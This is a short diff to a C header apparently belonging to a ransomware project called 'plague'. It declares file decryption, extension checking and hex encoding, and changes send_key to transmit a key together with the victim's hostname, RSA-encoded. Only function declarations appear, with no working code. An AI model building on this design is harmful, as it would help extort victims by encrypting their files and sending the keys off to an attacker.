@@ -24,6 +24,9 @@ void decrypt_file(unsigned char key[], unsigned char iv[], const char *path);
 int check_ext(const char *path);
 char *encode_hex(const unsigned char *key, int size);
 unsigned char    *decode_hex(char *hex, int size);
-int send_key(char *key);
+int send_key(char *key, char *hostname);
+char*   get_hostname();
+unsigned char *rsa_encode(unsigned char *json, size_t *len);
+char *bin2hex(const unsigned char *bin, size_t len);
 
 #endif //PLAGUE_PLAGUE_H
